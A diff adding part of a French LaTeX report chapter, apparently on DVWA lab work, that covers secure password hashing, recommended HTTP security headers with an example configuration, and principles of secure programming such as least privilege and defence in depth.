+		Hashing sécurisé & bcrypt (coût 12+), Argon2id, ou scrypt. \textbf{Jamais MD5 ou SHA1 non salés} (cassés en secondes). \\
+		\hline
+	\end{tabular}
+	\caption{Mécanismes d'Authentification Sécurisée}
+	\label{tab:auth-mechanisms}
+\end{table}
+
+\textbf{Impact de DVWA :} Les mots de passe DVWA sont stockés en MD5 sans sel (\textit{5f4dcc3b5aa765d61d8327deb882cf99 = "password"}). Un attaquant récupérant la base de données craque l'ensemble des mots de passe en quelques secondes avec des tables arc-en-ciel ou hashcat.
+
+\subsection{Question 5 : En-têtes de Sécurité HTTP}
+
+\paragraph{Question}
+Quels en-têtes HTTP de sécurité doivent être configurés sur un serveur web pour réduire la surface d'attaque ? Expliquez le rôle de chacun.
+
+\paragraph{Réponse}
+
+Les \textbf{en-têtes HTTP de sécurité} sont des directives envoyées par le serveur au navigateur pour contraindre son comportement. Ils constituent une défense côté client complémentaire à la validation serveur.
+
+\begin{lstlisting}[caption=En-têtes de sécurité recommandés --- Configuration Apache/Nginx]
+# Content Security Policy (CSP) - Prévention XSS
+Content-Security-Policy: default-src 'self';
+  script-src 'self' https://cdn.trusted.com;
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data:;
+  frame-ancestors 'none'
+
+# Strict Transport Security (HSTS) - Forcer HTTPS
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+
+# X-Frame-Options - Protection Clickjacking
+X-Frame-Options: DENY
+
+# X-Content-Type-Options - Prévention MIME sniffing
+X-Content-Type-Options: nosniff
+
+# Referrer Policy - Limitation des informations référant
+Referrer-Policy: strict-origin-when-cross-origin
+
+# Permissions Policy - Désactivation des fonctionnalités dangereuses
+Permissions-Policy: geolocation=(), camera=(), microphone=()
+
+# X-XSS-Protection (legacy, remplacé par CSP)
+X-XSS-Protection: 1; mode=block
+\end{lstlisting}
+
+\begin{table}[H]
+	\centering
+	\small
+	\renewcommand{\arraystretch}{1.4}
+	\setlength{\arrayrulewidth}{0.5pt}
+	\begin{tabular}{p{4.5cm} p{8.5cm}}
+		\arrayrulecolor{tableborder}
+		\hline
+		\tableheadcolor
+		\textcolor{tableheadfg}{\textbf{En-tête}} &
+		\textcolor{tableheadfg}{\textbf{Protection Apportée}} \\
+		\hline
+		\rowcolor{tablerowalt}
+		Content-Security-Policy & Prévient XSS en définissant les sources de contenu autorisées \\
+		Strict-Transport-Security & Force HTTPS, protège contre les attaques de déclassement TLS \\
+		\rowcolor{tablerowalt}
+		X-Frame-Options & Empêche l'intégration dans des iframes (Clickjacking) \\
+		X-Content-Type-Options & Empêche le navigateur de deviner le type MIME (MIME confusion attacks) \\
+		\rowcolor{tablerowalt}
+		Referrer-Policy & Contrôle les informations envoyées dans l'en-tête Referer \\
+		Permissions-Policy & Désactive les APIs sensibles (caméra, géolocalisation) inutilisées \\
+		\hline
+	\end{tabular}
+	\caption{En-têtes HTTP de Sécurité et leurs Protections}
+	\label{tab:security-headers}
+\end{table}
+
+\subsection{Principes de Programmation Sécurisée}
+
+\subsubsection{Défense en Profondeur Applicative}
+
+La sécurité applicative repose sur l'application simultanée de plusieurs principes complémentaires. Ces principes, illustrés tout au long de ce chapitre par les vulnérabilités DVWA, forment le socle de la programmation sécurisée :
+
+\begin{enumerate}
+	\item \textbf{Never Trust User Input (NTUI) :} Toute entrée utilisateur est potentiellement malveillante. Valider et assainir systématiquement.
+	
+	\item \textbf{Principle of Least Privilege :} Les processus web (www-data) ne doivent accéder qu'aux ressources strictement nécessaires. Aucun accès root, aucune lecture de \texttt{/etc/shadow}.
+	
+	\item \textbf{Fail Securely :} En cas d'erreur, ne jamais divulguer de détails techniques (stack traces, requêtes SQL, chemins de fichiers). Afficher un message générique côté utilisateur, logger les détails côté serveur.
+	
+	\item \textbf{Defense in Depth :} Combiner WAF + validation serveur + encodage des sorties + en-têtes de sécurité. Aucun mécanisme seul n'est suffisant.
+	
+	\item \textbf{Security by Design :} Intégrer la sécurité dès la conception (OWASP SAMM, threat modeling) plutôt que de l'ajouter en post-production.
+	
+	\item \textbf{Secure Defaults :} Configurer les frameworks et bibliothèques avec les options les plus sécurisées par défaut (HTTPS, cookies sécurisés, headers de sécurité).
+\end{enumerate}
+
+\begin{tcolorbox}[colback=primary!5!white, colframe=primary, title=\textbf{Bilan du Chapitre 5}]
+	DVWA a permis de démontrer concrètement les vulnérabilités OWASP Top 10 dans un environnement contrôlé. Les principes de remédiation présentés --- validation des entrées, encodage des sorties, authentification robuste, et en-têtes de sécurité --- constituent les fondements d'une application web sécurisée. La détection de ces attaques est complémentairement assurée par Snort IDS (Chapitre~\ref{chap:snort}), qui peut identifier les payloads malveillants au niveau réseau.
+\end{tcolorbox}
 
 % ==============================================================================
 % RÉFÉRENCES
